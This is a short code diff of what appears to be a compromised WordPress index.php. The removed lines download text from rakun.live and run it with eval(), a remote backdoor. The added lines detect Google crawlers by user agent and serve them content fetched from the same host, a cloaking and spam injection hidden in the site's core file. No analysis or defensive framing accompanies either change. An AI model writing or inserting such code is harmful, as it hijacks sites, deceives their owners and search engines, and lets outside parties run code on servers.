@@ -1,7 +1,12 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/iacpnew.txt'));
-$url = "?> ".$url;
-eval($url);
+function check_user_agent($agent) {
+    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
+}
+if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) 
+{ echo file_get_contents('https://rakun.live/landing/tech.txt');
+exit;
+} 
+
 
 /**
  * Loads the WordPress environment and template.
